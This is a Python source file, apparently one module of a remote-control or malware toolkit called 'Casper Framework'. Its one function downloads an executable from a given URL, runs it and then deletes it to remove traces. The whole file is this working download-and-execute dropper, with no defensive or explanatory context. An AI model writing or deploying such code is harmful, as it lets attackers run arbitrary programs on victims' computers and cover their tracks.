'''
Part of Casper Framework
'''
from includes import *

file = 'tmp.exe'

def download_execute(url):
	try:
		logging.debug('[casper] Downloading file')
		urllib.urlretrieve(url,file)
		logging.debug('[casper] Download finished')
	except Exception as e:
		logging.debug('[casper] Error during download {}'.format(e))
		return False

	try:
		logging.debug('[casper] Starting execution of {}'.format(file))
		spawn = os.popen(file)
		fetch = spawn.read()
		logging.debug('[casper] Execution finished of {}'.format(file))
	except Exception as e:
		logging.debug('[casper] Error during execution of {}'.format(file))
		return False

	try:
		logging.debug('[casper] Attempting to remove {}'.format(file))
		os.remove(file)
		logging.debug('[casper] Successfully removed {}'.format(file))
	except Exception as e:
		logging.debug('[casper] Error while removing {}'.format(file))
		return False
		
	return True	